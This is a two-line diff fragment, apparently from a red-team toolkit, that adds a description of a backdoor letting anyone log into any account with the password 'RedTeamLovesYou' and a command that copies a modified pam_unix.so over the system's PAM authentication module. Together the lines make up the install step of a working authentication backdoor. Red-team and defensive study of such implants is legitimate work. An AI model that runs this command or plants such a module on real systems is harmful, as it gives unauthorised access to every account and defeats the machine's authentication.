@@ -1,0 +1,2 @@
+Allows access to any account by using the password 'RedTeamLovesYou'
+	cp pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so
